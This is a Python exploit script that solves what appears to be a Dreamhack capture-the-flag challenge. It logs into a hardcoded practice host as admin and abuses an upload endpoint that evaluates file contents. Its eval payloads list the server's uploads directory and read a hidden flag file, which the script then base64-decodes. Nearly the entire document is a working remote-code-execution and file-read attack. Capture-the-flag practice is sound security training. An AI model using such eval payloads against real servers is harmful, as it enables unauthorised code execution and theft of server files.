import re
import base64
import ast
import requests

# Gán cứng URL target ở đây
BASE_URL = "http://host8.dreamhack.games:23519/"

HEX_FLAG_RE = re.compile(r"^[0-9a-f]{16}\.txt$")

def login(sess):
    r = sess.post(f"{BASE_URL}/", data={"username": "admin", "password": "adminpass"}, allow_redirects=False)
    if r.status_code in (302, 303) and "session" in sess.cookies:
        return True
    raise RuntimeError("Login failed (check URL or creds)")

def upload_eval(sess, code, name="p.txt"):
    files = {"file": (name, code)}
    r = sess.post(f"{BASE_URL}/upload", files=files)
    if r.status_code != 200:
        raise RuntimeError(f"Upload/eval failed: HTTP {r.status_code}")
    return r.text.strip()

def main():
    sess = requests.Session()

    # 1) Login as admin/adminpass
    login(sess)

    # 2) Eval payload to list files in ./uploads
    listing_payload = "__import__('os').listdir('./uploads')"
    listing_text = upload_eval(sess, listing_payload, "list.txt")

    try:
        files = ast.literal_eval(listing_text)
        if not isinstance(files, list):
            raise ValueError
    except Exception:
        raise RuntimeError(f"Unexpected directory listing output: {listing_text!r}")

    # 3) Find the random flag file: 16 hex chars + '.txt'
    candidates = [f for f in files if HEX_FLAG_RE.match(f)]
    if not candidates:
        raise RuntimeError(f"No flag-like file found in uploads: {files}")
    flag_name = candidates[0]

    # 4) Read the file content via eval
    read_payload = f"open('./uploads/{flag_name}','r').read()"
    b64_text = upload_eval(sess, read_payload, "read.txt").strip()

    # 5) Base64-decode to get the real flag
    try:
        flag = base64.b64decode(b64_text).decode(errors="replace").strip()
    except Exception as e:
        raise RuntimeError(f"Base64 decode failed: {e}; raw: {b64_text!r}")

    print("[+] Flag file:", flag_name)
    print("[+] Flag:", flag)

if __name__ == "__main__":
    main()
